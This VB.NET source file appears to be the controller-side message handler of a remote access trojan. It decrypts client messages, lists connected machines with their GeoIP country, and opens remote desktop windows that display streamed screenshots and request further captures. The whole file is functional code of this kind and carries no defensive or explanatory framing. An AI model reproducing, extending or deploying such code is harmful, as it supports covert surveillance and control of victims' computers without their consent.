Public Class Messages

    Public Shared F As Form1
    Private Shared Gio As New GeoIP()
    Delegate Sub _Read(ByVal C As Client, ByVal b() As Byte)

    Public Shared Sub Read(ByVal C As Client, ByVal b() As Byte)
        Try
            Dim A As String() = Split(BS(AES_Decryptor(b, C)), Settings.SPL)
            Select Case A(0)

                Case "INFO"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else

                        C.L = F.LV1.Items.Insert(0, String.Concat(C.IP.Split(":")(0), ":", C.C.LocalEndPoint.ToString.Split(":")(1)))
                        C.L.SubItems.Add(Gio.LookupCountryName(C.IP.Split(":")(0)))
                        C.L.Tag = C
                        For i As Integer = 1 To A.Length - 1
                            C.L.SubItems.Add(A(i))
                        Next
                        C.L.SubItems.Add(0)
                        F.LV1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        ClinetLog(C, "Connected", Color.Green)
                    End If
                    Exit Select

                Case "RECEIVED"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        C.L.ForeColor = Nothing
                    End If
                    Exit Select

                Case "RD-"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + C.IP)
                        If RD Is Nothing Then
                            RD = New RemoteDesktop
                            RD.F = F
                            RD.C = C
                            RD.Name = "RD" + C.IP
                            RD.Text = "RD" + C.IP
                            RD.Show()
                        End If
                    End If
                    Exit Select

                Case "RD+"
                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + C.IP)
                        If RD IsNot Nothing Then
                            RD.Text = " Remote Desktop " + C.IP.Split(":")(0) + " [" + _Size(b.LongLength) + "]"
                            Using MM As IO.MemoryStream = New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(1)))
                                RD.PictureBox1.Image = Image.FromStream(MM)
                            End Using
                            If RD.Button1.Text = "Capturing..." AndAlso RD.isOK = True Then
                                Dim Bb As Byte() = SB("RD+" + Settings.SPL + RD.PictureBox1.Width.ToString + Settings.SPL + RD.PictureBox1.Height.ToString)
                                Try
                                    Dim ClientReq As New Outcoming_Requests(C, Bb)
                                    Pending.Req_Out.Add(ClientReq)
                                Catch ex As Exception
                                End Try
                            End If

                        End If
                    End If
                    Exit Select

                Case "Msg"
                    ClinetLog(C, A(1), Color.Black)
                    Exit Select

            End Select
            Exit Sub
        Catch ex As Exception
            Debug.WriteLine("Messages " + ex.Message)
            ClinetLog(Nothing, ex.Message, Color.Red)
        End Try
    End Sub

    Delegate Sub _ClinetLog(ByVal CL As Client, ByVal Msg As String, ByVal Color As Color)
    Public Shared Sub ClinetLog(ByVal CL As Client, ByVal Msg As String, ByVal Color As Color)
        If F.InvokeRequired Then : F.Invoke(New _ClinetLog(AddressOf ClinetLog), New Object() {CL, Msg, Color}) : Exit Sub : Else
            If CL IsNot Nothing Then
                Dim lvi As ListViewItem = New ListViewItem()
                lvi.Text = String.Format("{0} -> {1} -> {2}", DateTime.Now.ToShortTimeString, CL.IP.Split(":")(0) + ":" + CL.C.LocalEndPoint.ToString.Split(":")(1), Msg)
                lvi.ForeColor = Color
                F.LV2.Items.Insert(0, lvi)
                F.LV2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Else
                Dim lvi As ListViewItem = New ListViewItem()
                lvi.Text = String.Format("{0} -> {1}", DateTime.Now.ToLongTimeString, Msg)
                lvi.ForeColor = Color
                F.LV2.Items.Insert(0, lvi)
                F.LV2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            End If
        End If
    End Sub

End Class
